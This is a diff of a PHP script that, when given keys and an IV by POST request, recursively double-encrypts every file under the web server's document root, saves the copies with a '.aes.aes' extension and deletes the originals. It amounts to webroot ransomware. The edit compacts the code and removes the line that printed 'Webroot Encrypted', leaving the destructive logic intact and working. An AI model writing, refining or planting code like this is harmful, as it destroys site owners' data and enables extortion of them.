@@ -9,24 +9,18 @@ function encrypt_decrypt($action, $string, $secret_key, $secret_iv) {
     $iv = substr(hash('sha256', $secret_iv), 0, 16);
 
     if( $action == 'encrypt' ) {
-        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
-        $output = base64_encode($output);
+        return base64_encode(openssl_encrypt($string, $encrypt_method, $key, 0, $iv));
     }
     else if( $action == 'decrypt' ){
-        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
+        return openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
     }
-
-    return $output;
 }
 
 function encfile($filename){
 	if (strpos($filename, '.aes.aes') !== false) {
     return;
 	}
-	$decrypted = file_get_contents($filename);
-	$encrypted = encrypt_decrypt('encrypt', $decrypted, $key1, $iv);
-	$encrypted2 = encrypt_decrypt('encrypt', $encrypted, $key2, $iv);
-	file_put_contents($filename.".aes.aes", $encrypted2);
+	file_put_contents($filename.".aes.aes", (encrypt_decrypt('encrypt', (encrypt_decrypt('encrypt', file_get_contents($filename), $_POST['key1'], $_POST['iv'])), $_POST['key2'], $_POST['iv'])));
 	unlink($filename);
 }
 
@@ -41,12 +35,7 @@ function encdir($dir){
 	}
 }
 
-$key1 = $_POST['key1'];
-$key2 = $_POST['key2'];
-$iv = $_POST['iv'];
-
 if(isset($_POST['key1']) && isset($_POST['key2']) && isset($_POST['iv'])){
 	encdir($_SERVER['DOCUMENT_ROOT']);
-	echo "Webroot Encrypted";
 }
 ?>
